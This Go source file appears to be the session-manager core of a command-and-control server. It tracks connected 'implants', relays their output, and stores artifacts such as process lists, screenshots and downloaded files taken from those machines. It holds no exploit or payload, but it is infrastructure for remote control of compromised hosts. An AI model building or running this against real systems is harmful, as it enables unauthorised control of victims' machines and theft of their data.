package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// Session is one connected implant. Each session runs a reader goroutine that
// decodes implant->server lines and fans them out as Events to subscribers.
type Session struct {
	ID        uint64
	Addr      string
	Since     time.Time
	conn      net.Conn
	wr        *bufio.Writer
	wrMu      sync.Mutex // serialize server->implant writes
	closed    atomic.Bool
	bus       *EventBus
	closeOnce sync.Once
}

func (s *Session) String() string { return fmt.Sprintf("#%d %s", s.ID, s.Addr) }

// Send writes a serverMsg to the implant (newline-terminated, flushed).
func (s *Session) Send(m serverMsg) error {
	b, err := json.Marshal(m)
	if err != nil {
		return err
	}
	s.wrMu.Lock()
	defer s.wrMu.Unlock()
	if _, err := s.wr.Write(b); err != nil {
		return err
	}
	if err := s.wr.WriteByte('\n'); err != nil {
		return err
	}
	return s.wr.Flush()
}

func (s *Session) Close() {
	s.closeOnce.Do(func() {
		s.closed.Store(true)
		s.conn.Close()
	})
}

// SessionManager holds all live sessions, keyed by ID.
type SessionManager struct {
	mu       sync.RWMutex
	sessions map[uint64]*Session
	nextID   uint64
	bus      *EventBus
}

func NewSessionManager(bus *EventBus) *SessionManager {
	return &SessionManager{sessions: make(map[uint64]*Session), bus: bus}
}

// Accept registers a new implant connection and starts its reader loop.
func (sm *SessionManager) Accept(conn net.Conn) *Session {
	id := atomic.AddUint64(&sm.nextID, 1)
	s := &Session{
		ID:    id,
		Addr:  conn.RemoteAddr().String(),
		Since: time.Now(),
		conn:  conn,
		wr:    bufio.NewWriter(conn),
		bus:   sm.bus,
	}
	sm.mu.Lock()
	sm.sessions[id] = s
	sm.mu.Unlock()

	sm.bus.Publish(Event{Type: "implant_connected", ImplantID: id, Data: s.Addr})
	fmt.Fprintf(logf(), "[core] implant %s connected\n", s)
	// Record the agent in the persistent roster (upserts last_seen/addr).
	if store != nil {
		store.TouchAgent(id, s.Addr, time.Now().Unix())
	}
	go s.readLoop()
	return s
}

func (sm *SessionManager) Get(id uint64) (*Session, bool) {
	sm.mu.RLock()
	defer sm.mu.RUnlock()
	s, ok := sm.sessions[id]
	return s, ok
}

func (sm *SessionManager) List() []SessionInfo {
	sm.mu.RLock()
	defer sm.mu.RUnlock()
	out := make([]SessionInfo, 0, len(sm.sessions))
	for _, s := range sm.sessions {
		out = append(out, SessionInfo{ID: s.ID, Addr: s.Addr, Since: s.Since})
	}
	return out
}

func (sm *SessionManager) remove(id uint64, s *Session) {
	sm.mu.Lock()
	delete(sm.sessions, id)
	sm.mu.Unlock()
	s.Close()
	sm.bus.Publish(Event{Type: "implant_disconnected", ImplantID: id, Data: s.Addr})
	fmt.Fprintf(logf(), "[core] implant %s disconnected\n", s)
}

// readLoop decodes implant->server JSON lines until EOF/error.
func (s *Session) readLoop() {
	rd := bufio.NewReader(s.conn)
	scan := bufio.NewScanner(rd)
	scan.Buffer(make([]byte, 0, 1<<20), 4<<20)
	for scan.Scan() {
		line := scan.Text()
		if line == "" {
			continue
		}
		var m implantMsg
		if err := json.Unmarshal([]byte(line), &m); err != nil {
			fmt.Fprintf(logf(), "[core] implant %s bad line: %v\n", s, err)
			continue
		}
		// Map wire type -> event type, publish to subscribers.
		et := m.Type // "hello" | "output" | "error"
		s.bus.Publish(Event{Type: et, ImplantID: s.ID, Data: m.Data})
		// Correlate BOF output/error to the task that triggered it.
		if et == "output" || et == "error" {
			bofName := tasks.Feed(s.ID, et, m.Data)
			// Persist the output as a per-agent artifact (file_list/proc_list/
			// screenshot/file_download) so the GUI can rehydrate history after
			// a restart. Only captures successful output of known BOFs.
			if et == "output" && store != nil && bofName != "" {
				captureArtifact(bofName, s.ID, m.Data)
			}
		}
		switch m.Type {
		case "hello":
			fmt.Fprintf(logf(), "[core] implant %s hello: %s\n", s, m.Data)
		case "output":
			fmt.Fprintf(logf(), "[core] implant %s output: %s\n", s, m.Data)
		case "error":
			fmt.Fprintf(logf(), "[core] implant %s error: %s\n", s, m.Data)
		}
	}
	if err := scan.Err(); err != nil {
		fmt.Fprintf(logf(), "[core] implant %s read error: %v\n", s, err)
	}
	manager.remove(s.ID, s)
}

// SessionInfo is the JSON shape for GET /api/implants.
type SessionInfo struct {
	ID    uint64    `json:"id"`
	Addr  string    `json:"addr"`
	Since time.Time `json:"since"`
}
